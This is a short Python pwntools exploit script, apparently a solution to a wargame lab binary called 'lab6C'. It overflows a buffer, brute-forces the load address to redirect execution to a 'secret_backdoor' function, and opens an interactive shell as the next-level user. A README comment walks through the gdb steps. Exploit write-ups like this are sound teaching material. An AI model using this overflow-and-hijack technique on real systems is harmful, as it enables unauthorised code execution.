#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#### README ####
# For this to work first attach gdb, break on main and let the process run.
# When the breakpoint hits print secret_backdoor and copy the address 
# clear the last 3 hex values of the copied address and paste it into base_addr
# finally let the script run, it can take some time
# ex.
# gdb ./lab6C
# break main
# run
# print secret_backdoor
# $1 = {<text variable, no debug info>} 0xb77c372b <secret_backdoor>
#
# base_addr = 0xb77c3000
#### END ####

context.arch = "x86"

base_addr = 0xb77c3000
secret_backdoor = 0x0000072b

found_address = False

while not found_address:
    r = process("./lab6C")
    payload = "A"*(255-59)
    payload += p32(base_addr|secret_backdoor)
    payload += "C" * (255 - len(payload))

    r.sendlineafter('>:', 'A'*40+'\xff')

    r.sendlineafter('>:', payload)
    ret = r.recv(200)
    ret = r.recv(200)

    ret = ""

    r.sendline("/bin/sh")
    r.sendline("whoami")
    try:
        ret = r.recv(200, timeout=0.01)
    except:
        pass
    
    if ("lab6B" in ret):
        r.interactive()
        quit()
    
    r.close()
